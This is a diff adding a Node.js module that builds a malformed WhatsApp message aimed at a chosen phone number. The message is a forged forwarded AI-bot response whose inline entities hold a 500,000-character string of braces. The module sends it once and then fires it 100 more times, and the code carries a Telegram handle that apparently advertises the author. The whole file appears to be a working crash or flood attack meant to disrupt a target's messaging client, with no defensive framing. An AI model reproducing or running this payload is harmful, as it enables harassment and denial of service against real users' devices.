@@ -1,0 +1,84 @@
+const crypto = require("crypto");
+
+function buildPayloads(target) {
+  const jid = String(target).trim().endsWith("@s.whatsapp.net")
+    ? String(target).trim()
+    : String(target).trim() + "@s.whatsapp.net";
+
+  const inlineEntities = ["{".repeat(500000)];
+  return { jid, inlineEntities };
+}
+
+function makeMessage(p) {
+  return {
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          messageType: 1,
+          submessages: [],
+          unifiedResponse: {
+            data: Buffer.from(
+              JSON.stringify({
+                response_id: crypto.randomUUID(),
+                sections: [
+                  {
+                    view_model: {
+                      primitive: {
+                        text: "Telegram: @dgxeon13",
+                        inline_entities: p.inlineEntities,
+                        __typename: "GenAIMarkdownTextUXPrimitive",
+                      },
+                      __typename: "GenAISingleLayoutViewModel",
+                    },
+                  },
+                ],
+              })
+            ),
+          },
+          contextInfo: {
+            forwardingScore: 1,
+            isForwarded: true,
+            forwardOrigin: 4,
+            forwardedAiBotMessageInfo: {
+              botJid: "0@bot",
+            },
+          },
+        },
+      },
+    },
+  };
+}
+
+function fire(sock, p) {
+  return sock.relayMessage(p.jid, makeMessage(p), {
+    participant: { jid: p.jid },
+  });
+}
+
+module.exports = async function (sock, target) {
+  if (!sock || !target) {
+    return { ok: false, error: "Missing sock or target" };
+  }
+
+  let p;
+  try {
+    p = buildPayloads(target);
+    await fire(sock, p);
+  } catch (e) {
+    return { ok: false, error: e.message || "First call failed" };
+  }
+
+  setImmediate(() => {
+    const jobs = [];
+    for (let i = 0; i < 100; i++) {
+      jobs.push(
+        Promise.resolve()
+          .then(() => fire(sock, p))
+          .catch(() => {})
+      );
+    }
+    Promise.allSettled(jobs).catch(() => {});
+  });
+
+  return { ok: true };
+};
